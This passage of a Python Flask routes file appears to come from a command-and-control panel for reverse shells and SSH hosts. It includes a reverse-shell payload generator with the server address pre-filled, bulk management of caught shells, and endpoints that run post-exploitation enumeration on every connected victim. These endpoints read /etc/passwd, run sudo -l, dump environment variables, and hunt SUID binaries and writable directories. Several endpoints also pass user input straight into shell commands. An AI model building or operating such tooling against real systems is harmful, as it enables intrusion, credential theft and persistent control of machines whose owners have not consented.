                     'platform', 'shell_user', 'status', 'connected_at', 'last_seen', 'disconnected_at', 'notes']
        return ExportHelper.to_csv_response(sessions_data, 'sessions.csv', fieldnames)


@main_bp.route("/export/commands/<format>")
@login_required
def export_commands(format: str):
    """
    Export shell command history in various formats.
    Supports: csv, json, xlsx
    """
    executions = ShellExecution.query.order_by(ShellExecution.started_at.desc()).all()
    
    # Prepare data
    commands_data = []
    for exec in executions:
        duration = ""
        if exec.completed_at and exec.started_at:
            delta = exec.completed_at - exec.started_at
            duration = str(delta.total_seconds())
        
        commands_data.append({
            'id': exec.id,
            'shell_name': exec.shell.name,
            'shell_address': exec.shell.address,
            'group_name': exec.shell.group_name,
            'user': exec.user.username,
            'command': exec.command,
            'status': exec.status,
            'output': exec.output or '',
            'stdout': exec.stdout or '',
            'stderr': exec.stderr or '',
            'exit_code': exec.exit_code if exec.exit_code is not None else '',
            'started_at': exec.started_at.strftime('%Y-%m-%d %H:%M:%S'),
            'completed_at': exec.completed_at.strftime('%Y-%m-%d %H:%M:%S') if exec.completed_at else '',
            'execution_time': exec.execution_time if exec.execution_time else duration,
        })
    
    if format.lower() == 'json':
        return ExportHelper.to_json_response(commands_data, 'shell_commands.json')
    elif format.lower() in ['xlsx', 'excel']:
        return ExportHelper.to_excel_response(commands_data, 'shell_commands.xlsx', 'Shell Commands')
    else:  # default to CSV
        fieldnames = ['id', 'shell_name', 'shell_address', 'group_name', 'user', 'command', 'status',
                     'output', 'stdout', 'stderr', 'exit_code', 'started_at', 'completed_at', 'execution_time']
        return ExportHelper.to_csv_response(commands_data, 'shell_commands.csv', fieldnames)


@main_bp.route("/payload-generator")
@login_required
def payload_generator():
    """Show reverse shell payload generator with server IP/port pre-filled."""
    listener = get_listener(current_app)
    port = listener.port if listener else current_app.config.get("SHELL_LISTENER_PORT", 5000)
    # Auto-detect server IP
    server_ip = request.host.split(":")[0]
    if server_ip in ("127.0.0.1", "localhost", "0.0.0.0"):
        try:
            import socket as _sock
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            server_ip = s.getsockname()[0]
            s.close()
        except Exception:
            import logging
            logging.getLogger(__name__).debug("Could not auto-detect server IP", exc_info=True)
            server_ip = "YOUR_IP"
    return render_template("payload_generator.html", port=port, server_ip=server_ip)


@main_bp.route("/control-panel")
@login_required
def unified_dashboard():
    """Unified dashboard for both SSH hosts and reverse shells."""
    view_type = request.args.get("view", "shells").strip()
    
    # SSH Hosts data
    ssh_group = request.args.get("group", "").strip()
    ssh_page = _page_arg("page")
    
    ssh_query = Host.query.order_by(Host.name.asc())
    if ssh_group:
        ssh_query = ssh_query.filter(Host.group_name == ssh_group)
    
    ssh_pagination = ssh_query.paginate(page=ssh_page, per_page=PAGE_SIZE_DEFAULT, error_out=False)
    ssh_groups = sorted([g[0] for g in db.session.query(Host.group_name).distinct().all() if g[0]])
    ssh_total = Host.query.count()
    ssh_active = Host.query.filter_by(is_active=True).count()
    ssh_recent_commands = CommandExecution.query.count()
    
    # Reverse Shells data
    shell_group_filter = request.args.get("shell_group", "").strip()
    platform_filter = request.args.get("platform", "").strip()
    status_filter = request.args.get("status", "").strip()
    search_query = request.args.get("search", "").strip()
    shell_page = _page_arg("shell_page")
    
    shell_query = ReverseShell.query
    
    if shell_group_filter:
        shell_query = shell_query.filter(ReverseShell.group_name == shell_group_filter)
    
    if platform_filter:
        shell_query = shell_query.filter(ReverseShell.platform == platform_filter)
    
    if search_query:
        search_pattern = f'%{search_query}%'
        shell_query = shell_query.filter(
            db.or_(
                ReverseShell.address.like(search_pattern),
                ReverseShell.hostname.like(search_pattern),
                ReverseShell.shell_user.like(search_pattern),
                ReverseShell.name.like(search_pattern)
            )
        )
    
    listener = get_listener(current_app._get_current_object())
    active_shell_ids = set(listener.get_active_shells())
    
    shell_query = shell_query.order_by(ReverseShell.last_seen.desc().nullslast(), ReverseShell.name.asc())
    
    all_shells = shell_query.all()
    
    if status_filter == "active":
        filtered_shells = [s for s in all_shells if s.id in active_shell_ids]
    elif status_filter == "disconnected":
        filtered_shells = [s for s in all_shells if s.id not in active_shell_ids]
    else:
        filtered_shells = all_shells
    
    # Manual pagination for shells
    total_shells_count = len(filtered_shells)
    shells_per_page = PAGE_SIZE_DEFAULT
    total_shell_pages = max(1, (total_shells_count + shells_per_page - 1) // shells_per_page)
    shell_page = min(shell_page, total_shell_pages)
    start_idx = (shell_page - 1) * shells_per_page
    end_idx = start_idx + shells_per_page
    paginated_shells = filtered_shells[start_idx:end_idx]
    
    # Create pagination object for shells
    class SimplePagination:
        def __init__(self, page, total_pages, has_prev, has_next):
            self.page = page
            self.pages = total_pages
            self.has_prev = has_prev
            self.has_next = has_next
            self.prev_num = page - 1 if has_prev else page
            self.next_num = page + 1 if has_next else page
    
    shells_pagination = SimplePagination(
        shell_page,
        total_shell_pages,
        shell_page > 1,
        shell_page < total_shell_pages
    )
    
    shells_groups = sorted([g[0] for g in db.session.query(ReverseShell.group_name).distinct().all() if g[0]])
    shells_platforms = sorted([p[0] for p in db.session.query(ReverseShell.platform).distinct().all() if p[0]])
    shells_total = ReverseShell.query.count()
    shells_connected = len(active_shell_ids)
    shells_disconnected = shells_total - shells_connected
    
    return render_template(
        "unified_dashboard.html",
        view_type=view_type,
        # SSH data
        ssh_hosts=ssh_pagination.items,
        ssh_pagination=ssh_pagination,
        ssh_groups=ssh_groups,
        selected_ssh_group=ssh_group,
        ssh_total=ssh_total,
        ssh_active=ssh_active,
        ssh_recent_commands=ssh_recent_commands,
        # Shells data
        shells=paginated_shells,
        shells_pagination=shells_pagination,
        shells_groups=shells_groups,
        shells_platforms=shells_platforms,
        selected_shell_group=shell_group_filter,
        selected_platform=platform_filter,
        selected_status=status_filter,
        selected_search=search_query,
        active_shell_ids=active_shell_ids,
        shells_total=shells_total,
        shells_connected=shells_connected,
        shells_disconnected=shells_disconnected,
    )


# API Endpoints for Bulk Operations

@main_bp.route("/api/bulk-check-liveness", methods=["POST"])
@login_required
def bulk_check_liveness():
    """Check liveness of multiple SSH hosts."""
    data = request.get_json()
    ids = data.get("ids", [])
    
    if not ids:
        return jsonify({"error": "No IDs provided"}), 400
    
    hosts = Host.query.filter(Host.id.in_(ids)).all()
    online = 0
    offline = 0
    
    for host in hosts:
        try:
            target = _build_target(host)
            jump_host = _build_jump(host)
            result = run_ssh_command(
                target=target,
                command=LIVENESS_CHECK_COMMAND,
                timeout=5,
                strict_host_key=host.strict_host_key,
                jump_host=jump_host,
            )
            if result.return_code == 0:
                online += 1
                host.is_active = True
            else:
                offline += 1
                host.is_active = False
        except Exception:
            offline += 1
            host.is_active = False
    
    db.session.commit()
    
    return jsonify({"online": online, "offline": offline})


@main_bp.route("/api/bulk-check-shell-liveness", methods=["POST"])
@login_required
def bulk_check_shell_liveness():
    """Check liveness of multiple reverse shells."""
    data = request.get_json()
    ids = data.get("ids", [])
    
    if not ids:
        return jsonify({"error": "No IDs provided"}), 400
    
    listener = get_listener(current_app._get_current_object())
    active_shell_ids = set(listener.get_active_shells())
    
    shells = ReverseShell.query.filter(ReverseShell.id.in_(ids)).all()
    online = 0
    offline = 0
    
    for shell in shells:
        if shell.id in active_shell_ids:
            # Try sending a simple command to verify
            success, output = listener.execute_command(shell.id, LIVENESS_CHECK_COMMAND, timeout=5)
            if success and "test" in output.lower():
                online += 1
                shell.status = "connected"
                shell.last_seen = datetime.utcnow()
            else:
                offline += 1
                shell.status = "disconnected"
        else:
            offline += 1
            shell.status = "disconnected"
    
    db.session.commit()
    
    return jsonify({"online": online, "offline": offline})


@main_bp.route("/api/bulk-change-group", methods=["POST"])
@login_required
@role_required("admin")
def bulk_change_group():
    """Change group for multiple SSH hosts."""
    data = request.get_json()
    ids = data.get("ids", [])
    new_group = data.get("group", "").strip()
    
    if not ids or not new_group:
        return jsonify({"error": "IDs and group name required"}), 400
    
    hosts = Host.query.filter(Host.id.in_(ids)).all()
    for host in hosts:
        host.group_name = new_group
    
    db.session.commit()
    
    return jsonify({"updated": len(hosts), "group": new_group})


@main_bp.route("/api/bulk-change-shell-group", methods=["POST"])
@login_required
@role_required("admin")
def bulk_change_shell_group():
    """Change group for multiple reverse shells."""
    data = request.get_json()
    ids = data.get("ids", [])
    new_group = data.get("group", "").strip()
    
    if not ids or not new_group:
        return jsonify({"error": "IDs and group name required"}), 400
    
    shells = ReverseShell.query.filter(ReverseShell.id.in_(ids)).all()
    for shell in shells:
        shell.group_name = new_group
    
    db.session.commit()
    
    return jsonify({"updated": len(shells), "group": new_group})


@main_bp.route("/api/bulk-rename", methods=["POST"])
@login_required
@role_required("admin")
def bulk_rename():
    """Rename multiple SSH hosts using a pattern."""
    data = request.get_json()
    ids = data.get("ids", [])
    pattern = data.get("pattern", "").strip()
    
    if not ids or not pattern:
        return jsonify({"error": "IDs and pattern required"}), 400
    
    hosts = Host.query.filter(Host.id.in_(ids)).all()
    
    for index, host in enumerate(hosts, start=1):
        # Replace variables in pattern
        new_name = pattern
        new_name = new_name.replace("{name}", host.name)
        new_name = new_name.replace("{ip}", host.address)
        new_name = new_name.replace("{index}", str(index))
        new_name = new_name.replace("{group}", host.group_name)
        
        host.name = new_name
    
    db.session.commit()
    
    return jsonify({"updated": len(hosts)})


@main_bp.route("/api/bulk-rename-shells", methods=["POST"])
@login_required
@role_required("admin")
def bulk_rename_shells():
    """Rename multiple reverse shells using a pattern."""
    data = request.get_json()
    ids = data.get("ids", [])
    pattern = data.get("pattern", "").strip()
    
    if not ids or not pattern:
        return jsonify({"error": "IDs and pattern required"}), 400
    
    shells = ReverseShell.query.filter(ReverseShell.id.in_(ids)).all()
    
    for index, shell in enumerate(shells, start=1):
        # Replace variables in pattern
        new_name = pattern
        new_name = new_name.replace("{hostname}", shell.hostname or shell.name)
        new_name = new_name.replace("{ip}", shell.address)
        new_name = new_name.replace("{index}", str(index))
        new_name = new_name.replace("{group}", shell.group_name)
        new_name = new_name.replace("{platform}", shell.platform or "unknown")
        new_name = new_name.replace("{user}", shell.shell_user or "unknown")
        
        shell.name = new_name
    
    db.session.commit()
    
    return jsonify({"updated": len(shells)})


@main_bp.route("/api/bulk-delete", methods=["POST"])
@login_required
@role_required("admin")
def bulk_delete():
    """Delete multiple SSH hosts."""
    data = request.get_json()
    ids = data.get("ids", [])
    
    if not ids:
        return jsonify({"error": "No IDs provided"}), 400
    
    # Delete associated command executions first
    CommandExecution.query.filter(CommandExecution.host_id.in_(ids)).delete(synchronize_session=False)
    
    # Delete hosts
    deleted = Host.query.filter(Host.id.in_(ids)).delete(synchronize_session=False)
    db.session.commit()
    
    return jsonify({"deleted": deleted})


@main_bp.route("/api/bulk-delete-shells", methods=["POST"])
@login_required
@role_required("admin")
def bulk_delete_shells():
    """Delete multiple reverse shells."""
    data = request.get_json()
    ids = data.get("ids", [])
    
    if not ids:
        return jsonify({"error": "No IDs provided"}), 400
    
    # Delete associated shell executions first
    ShellExecution.query.filter(ShellExecution.shell_id.in_(ids)).delete(synchronize_session=False)
    
    # Delete shells
    deleted = ReverseShell.query.filter(ReverseShell.id.in_(ids)).delete(synchronize_session=False)
    db.session.commit()
    
    return jsonify({"deleted": deleted})


# ============================================================================
# Orchestration API Endpoints
# ============================================================================


def _orchestrate_ssh(host_ids: list, command: str, timeout: int = 30) -> list[dict]:
    """Run a command on multiple SSH hosts and return results."""
    hosts = Host.query.filter(Host.id.in_(host_ids), Host.is_active.is_(True)).all()
    results = []
    max_workers = min(max(len(hosts), 1), 8)

    host_configs = {}
    for host in hosts:
        try:
            host_configs[host.id] = {
                'host': host,
                'target': _build_target(host),
                'jump_host': _build_jump(host),
            }
        except Exception as exc:
            results.append({'host_id': host.id, 'host_name': host.name, 'success': False, 'output': f"Config error: {exc}"})

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(
                _run_command_for_host,
                cfg['host'], command, timeout, cfg['target'], cfg['jump_host']
            ): cfg['host']
            for cfg in host_configs.values()
        }
        for future in as_completed(futures):
            host = futures[future]
            try:
                _, result = future.result()
                results.append({
                    'host_id': host.id,
                    'host_name': host.name,
                    'success': result.return_code == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'return_code': result.return_code,
                })
            except Exception as exc:
                results.append({'host_id': host.id, 'host_name': host.name, 'success': False, 'output': str(exc)})

    return results


def _orchestrate_shells(shell_ids: list, command: str, timeout: int = 30) -> list[dict]:
    """Run a command on multiple reverse shells and return results."""
    shells = ReverseShell.query.filter(ReverseShell.id.in_(shell_ids), ReverseShell.is_active.is_(True)).all()
    listener = get_listener(current_app._get_current_object())
    active = set(listener.get_active_shells())
    results = []

    for shell in shells:
        if shell.id not in active:
            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': False, 'output': 'Shell is not connected'})
            continue
        try:
            success, output = listener.execute_command(shell.id, command, timeout=timeout)
            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': success, 'output': output})
        except Exception as exc:
            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': False, 'output': str(exc)})

    return results


@main_bp.route("/api/orchestrate/system-info", methods=["POST"])
@login_required
def orchestrate_system_info():
    """Gather system information from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "echo '===HOSTNAME==='; hostname 2>/dev/null; echo '===OS==='; uname -a 2>/dev/null || ver 2>nul; echo '===UPTIME==='; uptime 2>/dev/null; echo '===MEMORY==='; free -h 2>/dev/null || systeminfo 2>nul | findstr Memory; echo '===DISK==='; df -h 2>/dev/null || wmic logicaldisk get size,freespace,caption 2>nul; echo '===CPU==='; nproc 2>/dev/null || echo %NUMBER_OF_PROCESSORS% 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/network-info", methods=["POST"])
@login_required
def orchestrate_network_info():
    """Gather network information from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "echo '===INTERFACES==='; ip addr 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>nul; echo '===ROUTES==='; ip route 2>/dev/null || route -n 2>/dev/null || route print 2>nul; echo '===DNS==='; cat /etc/resolv.conf 2>/dev/null; echo '===CONNECTIONS==='; ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null || netstat -an 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/process-list", methods=["POST"])
@login_required
def orchestrate_process_list():
    """Get running processes from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "ps aux 2>/dev/null || tasklist 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/user-info", methods=["POST"])
@login_required
def orchestrate_user_info():
    """Get user/account information from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "echo '===CURRENT_USER==='; whoami 2>/dev/null; echo '===ID==='; id 2>/dev/null; echo '===LOGGED_IN==='; who 2>/dev/null || query user 2>nul; echo '===USERS==='; cat /etc/passwd 2>/dev/null | head -30 || net user 2>nul; echo '===SUDO==='; sudo -l 2>/dev/null || echo 'sudo not available'"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/service-status", methods=["POST"])
@login_required
def orchestrate_service_status():
    """Get service/daemon status from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "service": "nginx" (optional)}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    service = data.get("service", "").strip()
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    if service:
        command = f"systemctl status {service} 2>/dev/null || service {service} status 2>/dev/null || sc query {service} 2>nul"
    else:
        command = "systemctl list-units --type=service --state=running 2>/dev/null | head -60 || service --status-all 2>/dev/null | head -60 || sc query state= all 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/file-read", methods=["POST"])
@login_required
def orchestrate_file_read():
    """Read a file from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "path": "/etc/hostname"}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    file_path = data.get("path", "").strip()
    if not ids or not file_path:
        return jsonify({"success": False, "error": "IDs and file path required"}), 400

    command = f"cat {file_path} 2>/dev/null || type {file_path} 2>nul || echo 'File not found'"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/file-list", methods=["POST"])
@login_required
def orchestrate_file_list():
    """List files in a directory on selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "path": "/tmp"}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    dir_path = data.get("path", "/tmp").strip()
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = f"ls -la {dir_path} 2>/dev/null || dir {dir_path} 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/cron-jobs", methods=["POST"])
@login_required
def orchestrate_cron_jobs():
    """Get scheduled tasks/cron jobs from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "echo '===USER_CRONTAB==='; crontab -l 2>/dev/null || echo 'No crontab'; echo '===SYSTEM_CRON==='; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/crontab 2>/dev/null || schtasks /query 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/env-info", methods=["POST"])
@login_required
def orchestrate_env_info():
    """Get environment variables from selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "env 2>/dev/null || set 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/security-check", methods=["POST"])
@login_required
def orchestrate_security_check():
    """Run basic security checks on selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = (
        "echo '===SUID_FILES==='; find / -perm -4000 -type f 2>/dev/null | head -20; "
        "echo '===WRITABLE_DIRS==='; find / -writable -type d 2>/dev/null | head -20; "
        "echo '===OPEN_PORTS==='; ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null; "
        "echo '===FIREWALL==='; iptables -L -n 2>/dev/null || ufw status 2>/dev/null || netsh advfirewall show allprofiles 2>nul; "
        "echo '===SSH_CONFIG==='; cat /etc/ssh/sshd_config 2>/dev/null | grep -v '^#' | grep -v '^$' | head -20"
    )
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})


@main_bp.route("/api/orchestrate/package-list", methods=["POST"])
@login_required
def orchestrate_package_list():
    """List installed packages on selected hosts/shells.

    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
    """
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "Request body required"}), 400

    target_type = data.get("type", "shell")
    ids = data.get("ids", [])
    if not ids:
        return jsonify({"success": False, "error": "No IDs provided"}), 400

    command = "dpkg -l 2>/dev/null | head -50 || rpm -qa 2>/dev/null | head -50 || apk list --installed 2>/dev/null | head -50 || wmic product get name 2>nul"
    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)

    if target_type == "ssh":
        results = _orchestrate_ssh(ids, command, timeout)
    else:
        results = _orchestrate_shells(ids, command, timeout)

    return jsonify({"success": True, "results": results})
